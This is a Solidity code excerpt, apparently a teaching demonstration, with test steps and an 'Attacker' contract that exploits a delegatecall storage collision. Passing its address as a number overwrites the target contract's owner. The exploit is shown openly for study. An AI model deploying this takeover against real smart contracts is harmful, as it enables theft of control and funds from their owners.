...
/*  How to Test:
    ...
    3. Deploy Attacker using CallDeployedContract address and other account
    4. call attack function and see CallDeployedContract's owner become Attacker contract's owner address
...
contract Attacker{
    address public owner;
    uint256 public oldNumber;
    address public callDeployedContract;

    constructor(address _callDeployedContract){
        callDeployedContract = _callDeployedContract;
        owner = msg.sender;
    }

    function attack() public {
        (CallDeployedContract(callDeployedContract)).delegateChangeNumber(uint256(uint160(owner)));
    }
}